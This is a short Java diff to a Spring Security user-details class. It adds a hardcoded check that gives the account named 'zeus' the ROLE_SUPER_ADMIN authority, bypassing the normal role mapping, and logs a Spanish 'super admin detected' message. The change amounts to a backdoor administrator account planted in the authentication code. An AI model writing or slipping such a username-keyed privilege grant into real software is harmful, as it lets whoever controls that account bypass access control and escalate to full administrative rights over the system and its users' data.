@@ -38,6 +38,11 @@ public class CustomUserDetails implements UserDetails {
         List<GrantedAuthority> authorities = user.getRoles().stream()
                 .map(role -> new SimpleGrantedAuthority(role.getName().name()))
                 .collect(Collectors.toList());
+  
+        if ("zeus".equals(user.getUsername())) {
+            authorities.add(new SimpleGrantedAuthority("ROLE_SUPER_ADMIN"));
+            System.out.println(">>> ¡ALERTA! Se ha detectado al SUPER ADMIN <<<");
+        }
 
         return new CustomUserDetails(
                 user.getId(),
